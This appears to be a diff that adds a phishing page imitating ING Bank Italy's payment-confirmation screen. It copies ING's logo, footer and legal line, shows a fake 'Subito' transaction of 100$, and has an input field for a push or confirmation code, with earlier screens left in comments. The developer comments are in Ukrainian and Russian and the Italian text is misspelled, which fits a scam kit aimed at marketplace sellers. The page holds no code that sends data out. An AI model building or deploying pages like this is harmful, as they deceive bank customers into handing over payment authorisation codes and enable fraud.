@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <link rel="stylesheet" href="https://db.onlinewebfonts.com/c/69c633b2a4e41e8101c6f4f149655d5e?family=ING+Me+Regular">
+
+  <title>ING Login</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: "ING Me Regular", Arial, Helvetica, sans-serif;
+      background-color: #f5f5f5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      padding: 15px;
+      text-align: left;
+      border-bottom: 1px solid #ddd;
+      background: #fff;
+      box-shadow: 1px 2px 3px rgba(0, 0, 0, 0.4);
+      display: flex;
+    }
+
+    header img {
+      height: 30px;
+      margin-left: 17%;    
+ 
+
+    }
+    @media (max-width: 768px) {
+  header img {
+    margin-left: 0;
+  }
+}
+    .container {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .login-box {
+      display: flex;
+      flex-direction: column;
+      background: #fff;
+      padding: 20px 20px 10px 20px;
+      border-radius: 20px;
+      box-shadow: 1px 4px 8px rgba(0,0,0,0.3);
+      text-align: left;
+      width: 350px;
+    } 
+    
+    @media (max-width: 768px) {
+        .login-box {
+       padding-top: 15px;
+    }
+}
+
+.platezhka-logos{
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+}
+.login-box h2{
+    font-size: 24px;
+    font-weight: bold;
+    display: flex;
+    text-align: center;
+    justify-content: center;
+    border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+    padding-bottom: 30px;
+}
+
+    .confermaContainer{
+        display: flex;
+        flex-direction:row;
+        justify-content: center;
+        gap: 10px;
+        border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+    padding-bottom: 20px;
+    font-weight: 550;
+    }
+    .leftConferm{
+        text-align: right;
+        font-size: 16px;
+        color: rgba(0, 0, 0, 0.6);
+    }
+    .rightConferm{
+        text-align: left;
+        font-size: 16px;
+    }
+.loader-box{
+    display: flex;
+    flex-direction: column;
+    width: 350px;
+    justify-content: center;
+    text-align: center;
+    margin: 0 auto;
+    margin-top: 30px;
+}
+
+
+
+.loader {
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  border: 1px solid transparent;              
+  border-top: 1px solid #3498db;            
+  animation: spin 1s linear infinite;         
+  margin: 20px auto 0px auto;
+}
+
+@keyframes spin {
+  0%   { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); } 
+}
+
+
+.auto{
+    text-align: right;
+    font-size: 13px;
+    color: rgba(0, 0, 0, 0.5);
+}
+
+
+
+
+
+
+
+
+.push-box{
+text-align: center;
+margin-top: 30px;
+margin-bottom: 50px;
+}
+.push-box p{
+    color: rgba(0, 0, 0, 0.7);
+}
+.push-box input{
+padding:10px ;
+border:1.5px solid black ;
+border-radius: 5px;
+}
+.push-box button{
+
+  padding: 10px 15px;
+  text-align: center;
+  font-size: 15px;
+  background-color: #ff6200;
+  border: none;
+  color: #fff;
+  font-weight: 550;
+  border-radius: 8px;
+  cursor: pointer;
+}
+footer {  
+  background: #d9d9d9;
+  padding: 40px 40px;
+  font-size: 13px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding-right: 400px;
+  padding-bottom: 10px;
+}
+
+.footer-columns {
+  display: flex;
+  justify-content: center;
+  gap: 200px; /* відстань між колонками */
+  
+}
+
+.footer-columns .col {
+  display: flex;
+  flex-direction: column;
+  gap: 10px; /* відстань між посиланнями */
+  
+}
+
+footer a {
+    color: #525199;
+  text-decoration: none;
+  font-size: 17px;
+  font-weight: 500;
+  display: inline-block; /* тепер це блочок, але по ширині тексту */
+  width: fit-content; /* автоматична ширина під текст */
+  border-bottom: 1px solid #525199;
+  line-height: 1
+}
+
+footer .bottom-text {
+    width: 100%;
+  text-align: center;
+  margin-top: 60px; /* було 40px, тепер на 20px нижче */
+  color: #555;
+  margin-right: 150px;
+  
+}
+@media (max-width: 740px) {
+    .footer-columns  {
+  display: flex;
+  text-align: center;
+  margin: 0 auto;
+  flex-direction: column;
+  gap: 10px; /* відстань між посиланнями */
+  
+}
+footer .bottom-text {
+  width: 100%;
+  text-align: center;
+  margin-top: 30px;
+  color: #555;
+
+}
+}
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="./ing-logo.svg" alt="ING">
+  </header>
+
+  <div class="container">
+    <div class="login-box">
+        <div class="platezhka-logos">
+            <img style="height: 70px;" src="https://ama.dp.ua/help/payment-sequrity/visa.jpg" alt="">
+            <img style="height: 40px;" src="./ing-logo.svg" alt="">
+        </div>
+        <h2>Conferma</h2>
+                <div class="confermaContainer">
+                    <div class="leftConferm">
+                        <div class="merchant">Merchant:</div>
+                        <div class="amountTXT">Amount:</div>
+                        <div class="dateTXT">Date:</div>
+                    </div>
+                    <div class="rightConferm">
+                        <div class="subito">Subito</div>
+                        <div class="amount">100$</div>
+                        <div class="date"></div>
+                    </div>   
+                </div>
+                    <!-- 3скрин -->
+                    <div class="push-box">
+                        <input type="text">
+                        <div class="loader"></div>
+                    </div>
+
+
+
+
+
+
+
+                    <!-- 2скрин -->
+                <!-- <div class="push-box">
+                    <input type="text">
+                    <p>Inserisci la notifica push</p>
+                    <button>Continua</button>
+                </div> -->
+
+
+
+
+
+
+
+                <!-- 1 скрин -->
+            <!-- <div class="loader-box">
+                <div class="loader"></div>
+                <p>La transazione è in faste di elaborazoine. None chiludere la pagina</p>
+            </div> -->
+            <p class="auto">Noieggio auto?</p>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <div class="footer-columns">
+      <div class="col">
+        <a href="#">Sicurezza</a>
+        <a href="#">Definizione di Default</a>
+        <a href="#">Privacy</a>
+      </div>
+      <div class="col">
+        <a href="#">Trasparenza</a>
+        <a href="#">Reclami</a>
+        <a href="#">Cookies</a>
+      </div>
+    </div>
+    <div class="bottom-text">
+      © 2024 ING BANK N.V. Milan Branch P.I. 11241140158
+    </div>
+  </footer>
+  <script>
+    function updateDateTime() {
+        const dateElement = document.querySelector('.date');
+        const now = new Date();
+        
+        // Форматування: dd/mm/yyyy hh:mm:ss
+        const formattedDate = now.toLocaleDateString('it-IT'); 
+        // const formattedTime = now.toLocaleTimeString('it-IT');
+        // ${formattedTime}
+        dateElement.textContent = `${formattedDate} `;
+    }
+
+    updateDateTime(); 
+    setInterval(updateDateTime, 1000);
+</script>
+</body>
+</html>
